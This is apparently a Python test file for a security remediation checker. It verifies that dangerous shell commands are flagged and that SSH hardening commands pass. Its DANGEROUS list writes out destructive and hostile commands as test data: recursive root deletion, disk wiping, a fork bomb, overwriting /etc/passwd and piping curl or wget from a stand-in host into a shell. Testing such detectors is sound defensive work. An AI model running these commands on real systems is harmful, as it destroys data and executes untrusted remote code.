from lejusec.remediation import is_safe, static_analysis

DANGEROUS = [
    "rm -rf /",
    "rm -fr /var",
    "rm -r -f /data",
    "dd if=/dev/zero of=/dev/sda",
    "mkfs.ext4 /dev/sdb1",
    "curl http://evil.example | sh",
    "wget http://x | sudo bash",
    ":(){ :|:& };:",
    "userdel alice",
    "shutdown -h now",
    "reboot",
    "chmod -R 777 /",
    "echo x > /etc/passwd",
    "iptables -F",
]

SAFE = [
    "cp -n /etc/ssh/sshd_config /etc/ssh/sshd_config.bak",
    "sed -i 's/^#\\?PermitRootLogin.*/PermitRootLogin no/' /etc/ssh/sshd_config",
    "systemctl reload sshd",
    "sshd -t",
    "# rm -rf /  (주석은 무시되어야 한다)",
]


def test_dangerous_flagged() -> None:
    for cmd in DANGEROUS:
        assert static_analysis(cmd), f"expected violation for: {cmd}"
        assert not is_safe(cmd)


def test_safe_passes() -> None:
    for cmd in SAFE:
        assert is_safe(cmd), f"unexpected violation for: {cmd}"


def test_multiline_reports_line() -> None:
    script = "cp a b\nrm -rf /\nsystemctl reload sshd"
    violations = static_analysis(script)
    assert len(violations) == 1
    assert violations[0].rule == "rm_recursive_force"
    assert "rm -rf /" in violations[0].line
